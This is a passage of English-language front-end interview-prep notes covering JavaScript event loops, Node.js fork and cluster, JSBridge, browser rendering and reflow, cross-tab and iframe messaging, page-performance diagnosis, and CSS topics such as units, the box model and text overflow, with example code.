- **Macro-tasks**: Encompass operations like `setTimeout`, `setInterval`, and various web API calls. They are scheduled to execute once the current script finishes and the micro-task queue is cleared.
- **Micro-tasks**: Primarily involve promise-related operations, including async/await. These tasks execute immediately after the current script, before any pending macro-tasks, granting them a higher execution priority.

### Browser Event Loop:
- In the browser, the event loop shares the main thread with activities such as DOM rendering, necessitating efficient task management to avoid UI disruptions.
- The browser event loop manages two kinds of task queues: macro-tasks and micro-tasks. Micro-tasks are given precedence, executing right after the current task, even before proceeding to the next macro-task. This prioritization ensures prompt handling of operations like promise resolutions, often before rendering the next frame.

### Node.js Event Loop:
- Node.js, while also single-threaded and dependent on asynchronous execution, classifies macro-tasks and micro-tasks into specific types and priorities. This reflects its backend-oriented nature, focusing on efficient I/O operations rather than UI concerns.
- **Macro-task types in Node.js**, listed in order of priority:
  - **Timers**: Includes `setTimeout` and `setInterval` for scheduling future tasks.
  - **I/O Callbacks**: Addresses network, stream, and TCP errors.
  - **Idle/Prepare**: Consists of internal Node.js engine tasks.
  - **Poll**: Responsible for fetching new I/O events.
  - **Check**: Manages `setImmediate` callbacks.
  - **Close Callbacks**: Executes callbacks such as `socket.on('close')`.

- **Micro-task types in Node.js**:
  - **`process.nextTick`**: This function defers the execution of a callback until the current operation concludes, offering very high priority.
  - **Promise/async/await**: Handles asynchronous operations using promises.

- In Node.js, the event loop initially executes synchronous code, then processes all micro-tasks (with `process.nextTick` having utmost priority), followed by macro-tasks. It also attends to micro-tasks as they emerge during macro-task execution.

The event loop in both browser and Node.js is fundamentally similar, enabling asynchronous JavaScript execution within a single-threaded context. However, their implementations diverge significantly. In Node.js, macro-tasks and micro-tasks are distinctly categorized with defined priorities, mirroring its backend emphasis on effective I/O management. Both environments prioritize synchronous tasks first, then micro-tasks, and finally macro-tasks. The browser's event loop, specifically designed to maintain UI responsiveness, prioritizes micro-tasks to ensure smooth user experiences. Conversely, Node.js's event loop structure is tailored for efficient I/O processing.

## Node.js Process Creation and Communication

### Process vs Thread
- **Process**: A process is the minimum unit for an Operating System (OS) to allocate resources and scheduling. It operates within its own independent memory space, ensuring that processes do not interfere with each other's operations.
- **Thread**: A thread is the smallest unit of processing within a process. It shares the memory space of its parent process, allowing for efficient execution of concurrent operations within the same application. JavaScript, while operating on a single-threaded model, supports multithreading through mechanisms like Web Workers for web applications.

### Why Use Multiprocessing in JavaScript?
- **Utilization of Multi-core CPUs**: It allows applications to leverage multi-core CPU architectures, significantly improving computation speed and application responsiveness.
- **Memory Limitations**: Each Node.js process has a memory limit. Multiprocessing enables an application to surpass the memory limitations of a single process, utilizing more memory collectively across multiple processes.
- **Efficiency and Performance**: Multiprocessing can lead to better resource utilization, enhanced performance, and reduced execution times by distributing workload across multiple CPU cores.
- **Application Methods**: In the context of web applications, `WebWorker` is utilized for multiprocessing to offload tasks from the main thread. For server-side applications using Node.js, multiprocessing is achieved through the `fork` or `cluster` modules, facilitating concurrent execution of tasks and improved application scalability.

### Fork in Node.js
The `fork` method is a part of the `child_process` module in Node.js, designed to create child processes. Here is a example illustrating how to use `fork`:

```javascript
// Main process (e.g., server.js)
const http = require('http');
const { fork } = require('child_process');

const server = http.createServer((req, res) => {
    if (req.url === '/compute') {
        const computeProcess = fork('./compute.js');
        computeProcess.send('Start');

        computeProcess.on('message', (result) => {
            res.end(`Result: ${result}`);
        });

        computeProcess.on('exit', () => console.log('Computation process exited'));
    } else {
        res.end('Server is running');
    }
});

server.listen(3000, () => console.log('Server listening on port 3000'));

// Child process (e.g., compute.js)
process.on('message', (msg) => {
    if (msg === 'Start') {
        let sum = 0;
        for (let i = 0; i < 10000; i++) sum += i;
        process.send(sum);
        process.exit(0);
    }
});
```

### Cluster in Node.js
The `cluster` module in Node.js enables the creation of child processes that share server ports, facilitating load balancing across multiple CPU cores. Below is a example of using `cluster`:

```javascript
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
    console.log(`Master process is running with PID: ${process.pid}`);

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.process.pid} died. Restarting...`);
        cluster.fork();
    });
} else {
    http.createServer((req, res) => {
        res.writeHead(200);
        res.end('Hello from Node.js!');
    }).listen(8000);

    console.log(`Worker started with PID: ${process.pid}`);
}
```

**Best Practices**:
- **PM2 for Process Management**: In production, consider using PM2 or similar tools for advanced process management and load balancing. These tools offer more sophisticated monitoring, logging, and clustering features.
- **Fork vs. Cluster Usage**:
  - **Fork**: Best suited for offloading CPU-intensive tasks to child processes, thereby preventing the main application thread from blocking.
  - **Cluster**: Ideal for creating redundant worker processes in server applications, enhancing availability and fault tolerance, especially under high load.

## How to Prevent 300ms Delay for Double Click to Zoom on Mobile Phones?
On mobile web applications, a common issue is the 300ms delay when users attempt to double-click (tap) to zoom. This delay was originally implemented to differentiate between a tap (single click) and a double-tap (double click). However, this can interfere with the responsiveness of web applications. In the past, developers used libraries like FastClick to circumvent this delay. Modern browsers have introduced ways to address this issue by detecting the site's responsiveness through meta tags.

To prevent the 300ms delay on mobile devices without relying on external libraries like FastClick, ensure your web application is using responsive design principles. Implement the following meta tag in your HTML:
```html
<meta name="viewport" content="width=device-width, initial-scale=1">
```
This meta tag informs the browser that your website is optimized for mobile devices, prompting it to disable the 300ms delay for a better user experience. This approach is preferred as it relies on standard responsive design practices rather than additional scripts, improving your website's performance and compatibility.

## Describe JS-bridge principles

### What is JS-bridge
JSBridge serves as a middleware between native applications and JavaScript running within a webview. JavaScript cannot directly invoke native APIs due to the sandboxed nature of web content for security reasons. A JSBridge provides a structured interface through which JavaScript can communicate with the native side of an application. This enables web content to access device features or native functionality that is otherwise inaccessible to pure web applications. For example, within the Facebook app, it's possible to open H5 websites; this is facilitated by JSBridge, allowing the web content to interact with the app's native features.

### Frequent used methods to achieve JS-Bridge

1. **Global API Registration**: This method involves exposing native functions as global JavaScript functions that can be called directly from the web content. However, this approach may encounter issues with asynchronous execution, such as delays in reading from local files or fetching data over the network. For example:

```js
// Incorrect: const version = window.getVersion() // getVersion is from bridge, but have problem of lag at async, e.g. read from local file or web
async function getVersion() {
  return new Promise((resolve, reject) => {
    if (window.bridge && window.bridge.getVersion) {
      resolve(window.bridge.getVersion());
    } else {
      reject('Bridge or getVersion method not found.');
    }
  });
}
```

2. **URL Scheme (Recommended)**: This technique involves defining custom URL schemes that the native application can recognize and handle. When a webview navigates to a URL with a custom scheme, the app intercepts the request and performs the corresponding native action. This method is more flexible and allows for easy asynchronous communication. A common implementation involves creating invisible iframes to trigger these URL schemes without navigating away from the current page. The example provided showcases an SDK object encapsulating calls to different native functions via URL schemes:

```js
// Example of an SDK object to interface with native app functions through URL schemes
const sdk = {
    invoke(url, data, onSuccess, onError) {
        const iframe = document.createElement('iframe');
        iframe.style.visibility = 'hidden';
        document.body.appendChild(iframe);
        iframe.onload = () => {
            try {
                const content = iframe.contentWindow.document.body.innerHTML;
                onSuccess(JSON.parse(content));
            } catch (error) {
                onError(error);
            } finally {
                iframe.remove();
            }
        };
        iframe.onerror = (error) => {
            onError(error);
            iframe.remove();
        };
        iframe.src = `my-app-name://${url}?data=${encodeURIComponent(JSON.stringify(data))}`;
    },
    fn1(data, onSuccess, onError) {
        this.invoke('api/fn1', data, onSuccess, onError);
    },
    fn2(data, onSuccess, onError) {
        this.invoke('api/fn2', data, onSuccess, onError);
    },
    fn3(data, onSuccess, onError) {
        this.invoke('api/fn3', data, onSuccess, onError);
    }
};
```

## Describe the Complete Process of Entering a URL to Presenting the Page

When a URL is entered into a browser, the process from initiating a web request to the final rendering of the page involves several critical steps. Here is a detailed breakdown:

### Web Request
1. **DNS Lookup**: The browser initiates a DNS query to convert the hostname in the URL into an IP address. This process may involve querying multiple DNS servers.
2. **TCP Connection**: Establishes a TCP connection with the server using a three-way handshake. This ensures a reliable communication channel.
3. **HTTP Request**: The browser sends an HTTP request to the server's IP address, requesting the webpage content.
4. **Server Response**: The server processes the request and sends back a response, typically including the HTML source code of the page.

### Parsing HTML
1. **Resource Fetching**: As the browser parses the HTML, it may encounter references to external resources such as JavaScript, CSS, images, and videos. Each of these resources may require additional DNS lookups, TCP connections, and HTTP requests.
2. **DOM and CSSOM Trees**: The browser converts the HTML document into a structured format known as the Document Object Model (DOM). Simultaneously, CSS files are processed into the CSS Object Model (CSSOM) or style tree.
3. **Render Tree Construction**: The DOM and CSSOM trees are combined to form the render tree, which represents all visible elements on the page and their styles.
4. **Optimization**: To optimize loading and parsing:
   - CSS is typically placed in the `<head>` to avoid rendering blocks.
   - JavaScript files are placed at the end of the `<body>` or loaded with `defer` or `async` attributes to not block HTML parsing.
   - Specifying image dimensions helps in layout calculation and prevents reflows.

### Rendering the Page
1. **Layout Calculation**: The browser calculates the size and position of each element in the render tree.
2. **Painting**: The visible elements are then painted onto the screen.
3. **JavaScript Execution**: JavaScript files are executed, which may modify the DOM and trigger a re-rendering of the page.
4. **Asynchronous Loading**: Some resources, like CSS and images, are fetched asynchronously and may cause the page to render again upon loading.

### Repaint vs. Reflow

Understanding the difference between repaint and reflow is crucial in web development, especially for dynamic web pages where elements can change frequently due to animations, modals, dialogs, popups, or modifications to the DOM like adding or deleting elements.

#### Repaint
A repaint occurs when changes are made to an element's visual appearance that do not affect its layout in the document. Examples include changes in color, background-color, visibility, and outline. During a repaint, the element's geometry (size and position) remains unchanged, and thus, it does not impact the position of any other elements.

#### Reflow
Reflow, also known as layout, involves recalculating the positions and sizes of elements in the document. This process is more computationally expensive than repaints because it affects the layout of the element that is changing and may also impact other elements on the page. Causes of reflow include changes to the browser window size, alterations in content (such as adding or removing elements), and modifications to elements' styles affecting their sizes (e.g., width, height, margin, padding).

#### Difference
The primary difference between repaint and reflow is the scope of impact and the cost in terms of performance. Reflows can trigger repaints, but repaints do not necessarily cause reflows. Because reflows can impact the layout of the entire page, they are more performance-intensive than repaints.

#### Methods to Avoid Unnecessary Reflows
- **Batch Style Changes**: Apply multiple style changes at once by changing the class of an element instead of individual styles.
- **Minimize DOM Access**: Modify elements offscreen or in a document fragment before adding them to the DOM. Using `display: none` before making changes can remove the element from the flow, thus reducing reflow costs.
- **Use Block Formatting Context (BFC)**: Utilizing BFC properties can isolate elements from affecting each other, minimizing the need for reflows.
- **Event Optimization**: Use debouncing and throttling for events that trigger frequent reflows, such as window resizing or scrolling.
- **Optimize Animations**: Prefer CSS3 animations and `requestAnimationFrame` over JavaScript animations to reduce reflow and repaint costs.

### Expansion: Block Formatting Context (BFC)
A Block Formatting Context is an HTML box that serves as a containment boundary, ensuring that elements within it do not affect the layout of elements outside it. BFC can be triggered by:
- The root element (`html`).
- Elements with `float` properties other than `none`.
- Elements with `position: absolute` or `fixed`.
- Elements with `display: inline-block`, `table-cell`, `table-caption`, `flex`, `grid`, or other table-related values.
- Elements with `overflow` set to anything other than `visible`.

## How to Implement Multi-Tab Communication on a Website?

Implementing multi-tab communication in web applications allows for the sharing of data and messages between different tabs or windows of the same origin. Here are three common methods to achieve this, along with their advantages, limitations, and use cases.

### 1. Using WebSockets
WebSockets provide a full-duplex communication channel over a single, long-lived connection, enabling real-time data exchange between the client and server.

- **Advantages**:
  - No CORS (Cross-Origin Resource Sharing) limitations, allowing for communication across different domains.
  - Enables real-time, bidirectional communication between the client and server.

- **Limitations**:
  - Requires server-side support, which can be more costly and complex to implement compared to client-side-only solutions.
  - Maintaining a WebSocket connection can be resource-intensive for both the server and client.

- **Use Case**:
  Ideal for applications that require real-time data exchange, such as live chat applications, online gaming, and collaborative editing tools.

### 2. Using `localStorage`
`localStorage` is a web storage API that allows data to be stored in key-value pairs in the browser, and it can be used for communication between tabs within the same origin.

- **Advantages**:
  - Simple to implement and does not require server-side support.
  - Works across tabs within the same origin, making it suitable for sharing data between different parts of the same application.

- **Limitations**:
  - Limited to communication within the same origin.
  - Storage space is limited (typically around 5MB).

- **Example Code**:
  ```html
  <!-- In one tab (e.g., list page) -->
  <script>
      window.addEventListener('storage', event => {
          if (event.key === 'changeInfo') {
              console.info('New info received:', event.newValue);
          }
      });
  </script>
  <!-- In another tab (e.g., detail page) -->
  <script>
      document.getElementById('btn1').addEventListener('click', () => {
          const newInfo = {
              id: 100,
              name: 'Item ' + Date.now()
          };
          localStorage.setItem('changeInfo', JSON.stringify(newInfo));
      });
  </script>
  ```
  - **Key Points**:
    - Tabs A and B are within the same origin.
    - Tab A sets `localStorage`, and Tab B listens for changes in `localStorage`.

### 3. Using `SharedWorker`
`SharedWorker` is a type of Web Worker that allows for the creation of a shared execution environment, accessible by multiple scripts even if they are in different windows, iframes, or tabs.

- **Advantages**:
  - Enables communication and data sharing between tabs, iframes, or windows from the same origin.
  - Offloads work to a background thread, preventing UI blocking.

- **Limitations**:
  - More complex to implement and test compared to other methods.
  - Support across browsers can be inconsistent.
  - Limited to same-origin communication.

- **Example Code**:
  ```html
  <!-- In one tab (e.g., list) -->
  <script>
      const worker = new SharedWorker('worker.js');
      worker.port.onmessage = e => console.info('Message from worker:', e.data);
  </script>
  <!-- In another tab (e.g., detail) -->
  <script>
      const worker = new SharedWorker('worker.js');
      document.getElementById('btn1').addEventListener('click', () => {
          worker.port.postMessage('Message from detail tab');
      });
  </script>
  ```
  ```js
  // worker.js
  const ports = new Set();
  onconnect = event => {
      const port = event.ports[0];
      ports.add(port);
      port.onmessage = e => {
          // Broadcast the message to all connected ports except the sender
          ports.forEach(p => {
              if (p !== port) {
                  p.postMessage(e.data);
              }
          });
      };
      port.postMessage('SharedWorker initialized');
  }
  ```
  - **Key Points**:
    - `SharedWorker` can start a shared process for communication between tabs from the same origin.
    - It is capable of running JavaScript in the background, independent of any particular tab, allowing for more complex inter-tab communication scenarios.

### How to Achieve Communication Between a Website and an Iframe

Communicating between a website and an iframe can be efficiently achieved using the `window.postMessage()` method. This approach allows for secure cross-origin communication without being restricted by CORS (Cross-Origin Resource Sharing) policies. The `postMessage` method enables sending data from the parent page to an iframe or vice versa, regardless of their origin, ensuring a versatile and secure way to interact across different domains.

- **Advantages**:
  - Bypasses CORS restrictions, enabling communication across different origins.
  - Provides a mechanism to verify the origin of the messages, enhancing security.

- **Example Code**:

  - **Child (Iframe Content)**:
    ```html
    <!-- Child HTML content -->
    <p>Child page
      <button id="btn1">Send Message</button>
    </p>
    <script>
        const btn1 = document.getElementById('btn1');
        btn1.addEventListener('click', () => {
            console.info('Child button clicked');
            window.parent.postMessage('Message from child', '*'); // Use specific origin instead of '*' in production
        });

        window.addEventListener('message', event => {
            // Always check the origin of the data!
            if (/* validate event.origin */) {
                console.info('Origin:', event.origin);
                console.info('Child received:', event.data);
            }
        });
    </script>
    ```
  - **Parent**:
    ```html
    <!-- Parent HTML content -->
    <p>Index page
      <button id="btn1">Send Message</button>
    </p>
    <iframe id="iframe1" src="./child.html"></iframe>
    <script>
        const btn1 = document.getElementById('btn1');
        const iframe = document.getElementById('iframe1');

        btn1.addEventListener('click', () => {
            console.info('Parent button clicked');
            iframe.contentWindow.postMessage('Message from parent', '*'); // Use specific origin instead of '*' in production
        });

        window.addEventListener('message', event => {
            // Always validate the origin of the data!
            if (/* validate event.origin */) {
                console.info('Origin:', event.origin);
                console.info('Parent received:', event.data);
            }
        });
    </script>
    ```
- **Key Points**:
  - The `'*'` argument in `postMessage` indicates that the message can be sent to any origin. In production environments, this should be replaced with the specific target origin to prevent security vulnerabilities.
  - It's crucial to validate the `event.origin` in the message event listener to ensure that messages are only accepted from trusted sources. This validation prevents potential cross-site scripting (XSS) attacks.

## HTML5 First-Screen Optimization Techniques

### 1. Route Lazy Loading
- **Applicability**: Suitable for Single Page Applications (SPA) but not for Multi-Page Applications (MPA).
- **Concepts**: 
  - **SPA** refers to a web application or site that interacts with the user by dynamically rewriting the current page rather than loading entire new pages from the server. This results in a more fluid user experience similar to a desktop application.
  - **MPA** is a traditional web application approach that reloads the entire page and requests the HTML from the server on each page change.
- **Implementation in React**: Achieved by splitting the route and ensuring priority loading of the homepage. This can be done using React's `React.lazy` and `Suspense` for dynamic imports and lazy loading of components.

### 2. Server-Side Rendering (SSR) - Exemplified by Next.js
- **Explanation**: Traditional SPA renders the page in a complex process, downloading HTML and JavaScript first, then fetching other resources. SSR simplifies this process by serving a fully rendered HTML page directly from the server, improving performance.
- **Benefits**: Ideal for pure HTML5 pages as it offers ultimate performance optimization, albeit at a higher cost.
- **Historical Context**: SSR is not a new technology. It has been used since the HTML1.0 era in technologies like PHP, ASP, and JSP. With the evolution of technology and the separation of front-end and back-end development, it has gained recent attention for enhancing user experience. Nuxt.js (for Vue) and Next.js (for React) are current examples.

### 3. App Prefetch
- **Usage**: When an HTML5 page is displayed within an app WebView, such as opening a page on Facebook.
- **Method**: The app preloads the first screen content of an article when the user visits the list page. Upon entering the HTML5 page, content is retrieved directly from the app using JSBridge, allowing instant display of the first screen.

### 4. Pagination
- **Application**: Specifically for list pages.
- **Strategy**: Only the first page's content is displayed by default. More content is loaded as the user scrolls up, which can be optimized further with throttling to manage load performance.

### 5. Image Lazy Loading
- **Focus**: Primarily for detail pages.
- **Approach**: Text content is displayed by default, followed by images through lazy loading.
- **Note**: Ensure image dimensions are set in advance to reserve space, minimizing layout shifts and reflows.

### 6. Hybrid Approach
- **Method**: HTML, JavaScript, and CSS files are pre-downloaded to the app. Pages are loaded using the `file://` protocol within the app's WebView, which is significantly faster as it accesses local files.
- **Content Fetching**: Content is then fetched via AJAX and displayed, potentially in combination with app prefetching for enhanced performance.

## Handling Rendering of 100,000 Data Entries

It's essential to first communicate to the interviewer that returning 100,000 data entries in one go is technically impractical. A preferable approach would be to use **pagination** to limit the amount of data sent and rendered at any one time.

Before seeking solutions, assess whether the browser can handle processing 100,000 data entries. While handling such data as strings or simple data structures in JavaScript might be feasible, rendering them directly to the DOM would result in significant performance issues, including sluggishness and potential crashes.

### 1. **Custom Middleware Layer**:
Implement a custom Node.js middleware layer that fetches and processes the 100,000 data entries. The front-end application would then interact with this middleware instead of directly connecting to the backend server.

While this approach can help manage the data more efficiently by pre-processing it before rendering, it is costlier in terms of development time and resources.

### 2. **Virtual Scrolling (Virtual List)**:
Implement virtual scrolling to render only the DOM elements in the viewport. Elements outside the viewport are not rendered but are accounted for in terms of spacing to ensure smooth scrolling. As the user scrolls, elements enter the viewport are rendered, and those leaving the viewport are destroyed or reused.

Implementing virtual scrolling improves application performance significantly by reducing the number of DOM elements that need to be managed at any given time, thereby minimizing browser workload and memory usage.

This method is technically challenging to implement from scratch due to the need to manage the creation and destruction of DOM elements dynamically based on the scroll position. It is highly recommended to use third-party libraries that provide virtual scrolling capabilities.

For Vue.js projects, `Vue-virtual-scroll-list` can be used, and for React projects, `React-virtualized` is a suitable choice. These libraries simplify the implementation of virtual scrolling by handling the complexities of DOM element management based on scroll behavior.

However, even using these libraries, the performance is still a concern for phones and low-end devices. It's important to consider the user experience and the practicality of displaying such a large amount of data at once.


## How to diagnose performance issues in a slow HTML5 page?
Start by asking the interviewer whether the issue is related to slow operations or slow loading times to narrow down the problem scope and demonstrate proactive communication skills. Then, check for any errors; if there are errors, start investigating from there. If there are no errors, use Chrome's Performance tools for further investigation.

### Front-end Performance Metrics
- **First Paint (FP):** The time it takes for the browser to render the first pixel to the screen.
- **First Contentful Paint (FCP):** The time it takes for the browser to render the first DOM content.
- **First Meaningful Paint (FMP):** Deprecated. This metric was used to measure the time it takes for the browser to render meaningful content for the first time. It has been replaced by LCP.
- **DOMContentLoaded (DCL):** The time it takes for the DOM to be fully loaded and parsed.
- **Largest Contentful Paint (LCP):** The time it takes for the largest content element in the viewport to become visible.
- **Load:** The time it takes for the entire page and all its resources to fully load.

These metrics are arranged in chronological order: FP < FCP < FMP < DCL < LCP < Load.

### Chrome DevTools
- **Performance:** Records page performance data, including CPU, memory, network, rendering, and more. Enabling screenshots captures web page snapshots, and timing indicators can show the metrics mentioned above.
- **Network:** Analyzes network requests, including the resources requested, timeline, size, and more. It also shows an overview of performance metrics when enabled.

### Lighthouse
A popular third-party performance evaluation tool that works on both mobile and desktop. It provides an overall score, including the above metrics, and offers optimization suggestions such as using next-gen image formats (e.g., WebP, AVIF), compressing and correctly sizing images, which can save loading time.

**Example:**
```
npm install -g lighthouse
lighthouse https://www.baidu.com --view --preset=desktop
```

### Web Page Loading Slowly?
- Improve server hardware configurations, use CDN.
- Implement route lazy loading and asynchronously load large components to reduce the main package size.
- Optimize HTTP caching strategies.

### Slow Rendering?
- Optimize backend services (e.g., slow AJAX data fetching).
- Further analyze and optimize the logic within front-end components.
- Implement server-side rendering (SSR).

### Continuous Follow-up
Performance optimization is a gradual process, unlike bug fixes which can often be resolved quickly. Continuously monitor performance, identify bottlenecks, and implement optimizations progressively. Utilize third-party analytics services such as Alibaba Cloud ARMS, Baidu Analytics, or Google Analytics for ongoing performance tracking.

### Summary
Analyze performance metrics to identify the root causes of slowness, address issues specifically, and continuously improve and optimize for better performance.

# html-css.md

## CSS Units: Differences and Usage

1. **Pixels (px):** Pixels are a fixed-size unit that is most commonly used in screen media. A pixel is an absolute unit that doesn't change based on other elements. It's great for when you need precise control over element sizing, like for borders or shadows.

2. **Percent (%):** Percentages are relative units and depend on the parent element's size. They are extremely useful for creating layouts that adapt to different screen sizes, maintaining proportions regardless of the parent size.

3. **Ems (em):** Ems are relative to the font-size of the element they are used on. If used on font-size, they are relative to the font-size of the parent element. Ems are great for scalable typography and elements that need to maintain their proportions relative to text size.

4. **Rems (rem):** Rems are relative to the font-size of the root element (html). They allow for consistent scaling across the entire document and are very useful in responsive design for maintaining uniformity in spacing, layout, and typography.

5. **Viewport Width (vw):** 1vw is equal to 1% of the viewport's width. This unit is helpful for creating elements that scale with the width of the viewport, like for fluid layouts and typography.

6. **Viewport Height (vh):** Similarly, 1vh is 1% of the viewport's height. It's useful for elements that should scale with the height of the viewport, such as sections of a single-page layout.

7. **Viewport Minimum (vmin):** This unit is 1% of the viewport's smaller dimension (height or width). Vmin is particularly useful for maintaining aspect ratios in responsive design.

8. **Viewport Maximum (vmax):** Conversely, vmax is 1% of the larger dimension (height or width). It's less commonly used but can be beneficial for certain design challenges.

## Example of Responsive Design Code
```css
/* Base HTML font size */
html {
    font-size: 16px; /* Set a standard font size */
}

/* Responsive font size for smaller screens */
@media only screen and (max-width: 300px) {
    html {
        font-size: 14px; /* Reduce font size on small devices */
    }
}

/* Paragraph styling */
p {
    font-size: 1rem; /* Font size is relative to HTML element */
    line-height: 1.5; /* Good for readability */
    margin: 0 0 1rem 0; /* Spacing for paragraphs */
}

/* Responsive element styling */
@media only screen and (max-width: 768px) {
    p {
        font-size: 0.9rem; /* Smaller font size on tablets and smaller devices */
    }
}
```

This example demonstrates responsive typography using rem units and media queries. The base font size is set on the `html` element, which the `rem` units reference. Media queries adjust the base font size for smaller screens, affecting all elements using `rem`. The `p` (paragraph) styling is also adjusted for smaller screens to ensure readability.

## Box Model Explanation

The CSS box model is a fundamental concept in web development that describes how the dimensions of each HTML element are calculated. The components of the box model, from outer to inner, are:

1. **Margin**: The outermost layer, which defines the space between the element's border and surrounding elements.
2. **Border**: The border that surrounds the padding and content. It's the boundary between the margin and the padding.
3. **Padding**: The space between the border and the content. It increases the space inside the element.
4. **Content**: The innermost area where the actual text, images, or other media are displayed.
5. **Box-sizing**: A property that determines how the width and height of an element are calculated. If set to `border-box`, the element's padding and border are included in the element's width and height. If set to `content-box`, the width and height only include the content, not the padding or border. 

## Differences Between offsetHeight, scrollHeight, and clientHeight

1. **offsetHeight**: The `offsetHeight` property measures the total visible height of an element, including padding, border, and the scroll bar on the element (if any), but excluding margins. It's the outermost height measurement that includes everything inside the margin.

2. **clientHeight**: The `clientHeight` property measures the visible content area (including padding) of an element but excludes the border, scrollbar, and margin. It's useful for getting the actual area available for the content inside an element.

3. **scrollHeight**: The `scrollHeight` property measures the total height of an element's content, including content not visible on the screen due to overflow. It includes padding but excludes borders, scrollbar, and margin. This is larger than the `clientHeight` if there's content that overflows outside the visible area.

### Sample Answer
The primary differences among `offsetHeight`, `scrollHeight`, and `clientHeight` relate to what they include in their calculations. `offsetHeight` includes the border, padding, and the vertical scrollbar (if present), making it the total outer height. `clientHeight` includes the padding and the viewable content height, but not the border or scrollbar. Lastly, `scrollHeight` measures the total height of the content, including what's not visible due to overflow, plus padding. These properties are essential for dynamically managing layouts, handling scrolling behavior, or adjusting elements based on their content size.

## Retina Screen and 1px Lines Implementation

When designing for Retina displays, setting elements to 1px using CSS can result in lines that appear too thick, due to some mobile phones having a Device Pixel Ratio (DPR) of 2. This means 1 CSS pixel could use 2 physical pixels, making the line appear thicker than intended. Directly setting elements to 0.5px can lead to compatibility issues across different browsers. To achieve the desired 1px line appearance on Retina screens, we can use CSS pseudo-elements combined with the `transform` property for optimization. 

Here's an improved and corrected example:

```css
#box::before {
  content: '';
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  height: 1px;
  background: #d9d9d9;
  transform: scaleY(0.5);
  transform-origin: 0 0;
}
```

This approach leverages the `::before` pseudo-element to create a line that visually represents 1px on Retina displays by scaling it down by 50% along the Y-axis. This effectively simulates a thinner line without causing browser compatibility issues.

### Handling Borders with Border-Radius

When dealing with elements that have a border-radius, applying a thin border can be slightly more complex due to the way borders interact with the border-radius. In such cases, using `box-shadow` can offer a solution that allows for a fine-tuned appearance:

```css
#box {
  box-shadow: 0 0 0 0.5px #d9d9d9;
}
```

This method applies a `box-shadow` that mimics a border, allowing for the adjustment of its thickness to achieve the desired 0.5px visual effect on Retina displays. It's a versatile approach that maintains the element's aesthetic, including when a border-radius is applied, ensuring the visual consistency of the design across high-resolution screens.

## What is the difference between `defer` and `async` attributes in `<script>` elements?

The `<script>` element can be used to include JavaScript in HTML documents. When scripts are loaded and executed, they can affect how quickly a page becomes interactive. The `defer` and `async` attributes provide different ways to control this behavior.

### `defer`
The `defer` attribute tells the browser to continue parsing the HTML document while the script is being downloaded asynchronously. The key point is that the script execution is deferred until the entire HTML document has been parsed. This means that scripts with `defer` will not run until the HTML parsing is complete, which is similar to placing a `<script>` tag at the end of the `<body>` element. However, `defer` ensures that scripts are executed in the order they appear in the document, which is not guaranteed when scripts are manually placed at the bottom of the `<body>`. 

### `async`
The `async` attribute also allows the script to be downloaded in parallel to HTML parsing. However, unlike `defer`, `async` scripts are executed as soon as they are downloaded, which could be before or after the HTML parsing is complete. This means the execution order of scripts is not guaranteed. `async` is best used for scripts that do not depend on other scripts and do not modify the DOM (Document Object Model).

### Difference between Prefetch and DNS-Prefetch

#### Prefetch and Preload
- **Preload** is a directive used to instruct the browser to load a resource early in the page's lifecycle, because it will be needed soon. This is crucial for resources that are critical to the current page's content, ensuring they are loaded with higher priority. The syntax is `<link rel="preload" href="example.js" as="script">` (or as="style" for CSS files), indicating that the resource is important for the immediate page load.
- **Prefetch** is a hint to the browser that a resource might be needed in the future, but not on the current page. Resources prefetched are fetched and stored in the cache with low priority, during idle browser time, making them faster to load on subsequent page visits. The syntax is `<link rel="prefetch" href="example.js" as="script">`, suggesting the resource may be used in subsequent pages or actions.

#### DNS-Prefetch and Preconnect
- **DNS-Prefetch** is a way to resolve domain names (DNS lookups) before a user clicks on a link. This process reduces latency when the user navigates to the linked resource, as the DNS resolution step is already completed. The syntax for using it is `<link rel="dns-prefetch" href="//example.com">`. It's especially useful for third-party resources or any links that lead to different domains.
- **Preconnect** goes a step further than DNS-prefetch by not only resolving the domain name but also performing the TCP handshake and, if the protocol is HTTPS, the TLS negotiation. This fully prepares the browser for a future connection, reducing the connection establishment time. The syntax is `<link rel="preconnect" href="//example.com">`. Preconnect is more comprehensive than DNS-prefetch because it completes all the preliminary network steps, making the resource ready to be used with minimal delay.

### Summary
- Use **preload** for critical resources needed for the current page to ensure they are loaded quickly and with high priority.
- Use **prefetch** for resources that will be needed in subsequent page visits, to speed up their load time when the user navigates to those pages.
- Use **dns-prefetch** to resolve domain names ahead of time, reducing DNS lookup time for third-party resources or anticipated navigations.
- Use **preconnect** to fully prepare for a future connection, including DNS lookup, TCP handshake, and TLS negotiation, minimizing the latency for high-priority, cross-origin requests.

## How to handle text Overflow with Ellipsis in CSS? 

When working with web design and front-end development, managing text overflow elegantly ensures that the UI remains clean and user-friendly even when content exceeds its container's bounds. CSS provides mechanisms to handle single-line and multi-line text overflow scenarios, allowing text that doesn't fit in its container to be truncated and represented with an ellipsis (`...`). Here's how to achieve this:

### Single-line Text Overflow

For single-line text overflow, where you want text that exceeds the width of its container to end with an ellipsis, you can use the following CSS properties:

```css
#box1 {
    border: 1px solid #ccc;
    width: 100px; /* Fixed width */
    white-space: nowrap; /* Prevents text from wrapping to a new line */
    overflow: hidden; /* Hides text that overflows the container's bounds */
    text-overflow: ellipsis; /* Adds an ellipsis to indicate text overflow */
}
```

In this setup, `white-space: nowrap` ensures the text stays on a single line, `overflow: hidden` hides any overflow, and `text-overflow: ellipsis` replaces the hidden overflow text with an ellipsis.

### Multi-line Text Overflow

Handling text overflow for multi-line scenarios, where you want to limit the text to a specific number of lines and display an ellipsis for overflow text, involves a bit more CSS, particularly leveraging webkit-specific properties:

```css
#box2 {
    border: 1px solid #ccc;
    width: 100px; /* Fixed width */
    overflow: hidden; /* Hides text that overflows the container's bounds */
    display: -webkit-box; /* Displays the container as a webkit flex box */
    -webkit-box-orient: vertical; /* Sets the children's orientation to vertical */
    -webkit-line-clamp: 3; /* Limits the box to showing 3 lines of text, with overflow indicated by an ellipsis */
}
```

This method uses `-webkit-box`, `-webkit-box-orient`, and `-webkit-line-clamp` to achieve multi-line truncation. It's important to note that this approach is somewhat limited by its compatibility with only webkit-based browsers (e.g., Safari, Chrome). However, it's widely used due to its simplicity and effectiveness in most web scenarios.

## CSS Layout: Flexbox Solution for a Responsive Three-Div Setup

